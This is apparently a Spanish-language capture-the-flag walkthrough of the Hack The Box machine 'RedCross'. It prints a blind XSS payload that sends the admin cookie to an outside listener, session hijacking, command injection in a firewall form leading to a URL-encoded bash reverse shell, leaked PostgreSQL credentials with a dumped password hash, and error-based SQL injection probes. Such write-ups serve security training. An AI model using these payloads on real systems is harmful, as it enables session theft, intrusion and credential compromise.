PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
 
-Añadimos redcross.htb e intra.redcross.htb al /etc/hosts

-En la web encontramos un Login y el siguiente mensaje:
	-Please contact with our staff via [contact form](https://intra.redcross.htb/?page=contact) to request your access credentials.

-Vamos al Formulario de Contacto y probamos una **XSS INJECTION**:
	-<script>alert('XSS')</script>
		-La respuesta de la web es:
			-'OOPS , someone is trying to do something nasty'

-Parece que se está aplicando un filtrado para evitar inyecciones XSS

-Tras estar probando , descubro que los campos 'request' y 'details' , me bloquean cuando inyecto estos caracteres --> <> . Sin embargo, el último campo **'contact phone or email'** no lo bloquea

-Pruebo a inyectar la **típica XSS con alert** y no me bloquea pero **NO sale la ventana emergente**. Podemos estar ante un **'Blind XSS Injection'**:
	-En nuestra máquina:
		-nc -lvnp 80
	-En el campo víctima:
		-<script src="http://10.10.14.40/"></script>

-Inyectamos el siguiente código para ver si el 3 campo es vulnerable, iniciamos un listener con Netcat y si recibimos la conexión, el campo el vulnerable y podemos robar la Cookie

-pruebo a inyectar un Payload que me envía la cookie si alguien interactúa con el formulario:
	-Iniciamos un servidor con Python:
		-python3 -m http.server 8080
	-Inyectamos el Payload en el Campo Vulnerable, robamos la cookie:
		-<script>document.write('<img src="http://10.10.14.40:8080/carpx0.jpg?cookie=' + document.cookie + '">')</script>
			"GET /carpx0.jpg?cookie=PHPSESSID=moov8o4i91vpgfq73puj4c35g4;%20LANG=EN_US;%20SINCE=1746897716;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1"
			(HA FUNCIONADO!! , Hemos robado la Cookie del usuario **'admin'**)

-Para autenticarnos como el usuario admin , tenemos 2 opciones:
	1-CTRL Derecho --> Inspect --> Storage --> Cambiamos la Cookie y actualizamos la página
	2-Con la Extensión 'EditThisCookie':
		-Cambiamos la Cookie, le damos al Icono de Check y actualizamos la página

### Robar la Sesión Íntegra

-Basándonos en la siguiente Cookie Robada:
	-"GET /cookie.php?c=PHPSESSID=r3rouooa28nsn9hk1dedsg62d3;%20LANG=EN_US;%20SINCE=1746962399;%20LIMIT=10;%20DOMAIN=admin

-Nos vamos al Storage, dónde se guardan las Cookies en Firefox:
	-CTRL Derecho --> Inspect --> Storage 
	-Le damos al signo de '+'  hasta tener los mismos campos que la Cookie Robada
	-En este caso tenemos los campos:
		-PHPSESSID, LANG, SINCE, LIMIT, DOMAIN
	-Rellenamos todos los campos:
		Name                            Value
		PHPSESSID                r3rouooa28nsn9hk1dedsg62d3
		LANG                        EN_US
		SINCE                       1746962399
		DOMAIN                  admin
	-Recargamos la Página y habremos Secuestrado la sesión del usuario íntegra

-Entramos como el usuario 'admin' , Robando la sesión íntegra, encontramos varias conversaciones, en una de ellas hablan de un Panel Admin

-Hacemos Fuzzing de subdominios y encontramos los siguiente:
	-intra (Este es el que ya teníamos)
	-**admin** (Este es nuevo)

-Añadimos admin.redcross.htb al /etc/hosts

-Entramos a **'-https://admin.redcross.htb/'** , editamos la cookie y entramos como el **usuario 'admin'** gracias a la **Cookie robada** a través del **'Blind XSS Injection'**

-Dentro de **'-https://admin.redcross.htb/'** tenemos la capacidad de crear un Firewall, Interceptamos la petición con BurpSuite en:
	-https://admin.redcross.htb/?page=firewall
	(Añadiendo nuestra Ip en el campo 'WhiteList IP Address')

-La solicitud tiene la siguiente estructura:
	POST /pages/actions.php HTTP/1.1
	Host: admin.redcross.htb
	ip=10.10.14.40&action=Allow+IP

-Se está mandando nuestra IP cómo parámetro, puede que se esté ejecutando un comando en el sistema a partir de dicho parámetro, **modificamos  la solicitud** y **conseguimos RCE:**
	POST /pages/actions.php HTTP/1.1
	Host: admin.redcross.htb
	**ip=10.10.14.40;id&action=deny**
		**uid=33(www-data) gid=33(www-data) groups=33(www-data)**

-Mandamos la RS URL ENCODED y conseguimos acceso a la máquina:
	ip=10.10.14.40;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.40%2F1234%200%3E%261%27&action=deny
		**www-data@redcross:/$ whoami**
			**www-data**

## Escalada de Privilegios

-En la siguiente ruta encontramos credenciales para conectarse a mysql:
	-/var/www/html/admin/pages/actions.php
		 $dbconn = pg_connect("host=127.0.0.1 dbname=unix **user=unixusrmgr password=dheu%7wjx8B&**");

-La conexión no funciona con mysql -uunixusrmgr -pdheu%7wjx8B& 

-Buscando en Google el método **'pg_connect'**, descubrimos que es un método de PostgrestSQL, por lo que la forma de conectarse en distinta:
	-psql -h 127.0.0.1 -d unix -U unixusrmgr
	Password for user unixusrmgr: dheu%7wjx8B&
		unix=> 

-Comandos Postgrest:
	-\l: Listar todas las BD
	-\c: unix: Cambiar a la BD unix
	-\dt: Listar tablas 
		-Encontramos la tabla --> **passwd_table**
	-Listar campos de la tabla:
		-unix=> select * from passwd_table;
			tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp.


## EXTRA - MANUAL SQLI (ERROR BASED)

-Nos autenticamos con las siguientes credenciales:
	guest:guest

-La URL tiene la siguiente Estructura:
	-https://intra.redcross.htb/?o=1&page=app

-Ponemos una Comilla Simple en el Parámtro o:
	-https://intra.redcross.htb/?o=1'&page=app
		**You have an error in your SQL syntax**

**-Detección Inicial:**
	-Solo con la Comilla Simple, sigue apareciendo el Error si Comentamos:
		-https://intra.redcross.htb/?o=1'-- -&page=app
			**You have an error in your SQL syntax**
			(Esto significa que solo con la Comilla Simple, no logramos hacer Bypass de la Query)
		-Probamos con '):
			-https://intra.redcross.htb/?o=1')-- -&page=app
				YA NO SALE EL ERROR

-Averiguar el Número de Columnas:
	-https://intra.redcross.htb/?o=1') ORDER BY 4-- -&page=app
		-NO DA ERROR, Con 5 FALLA, TIENE 4 COLUMNAS



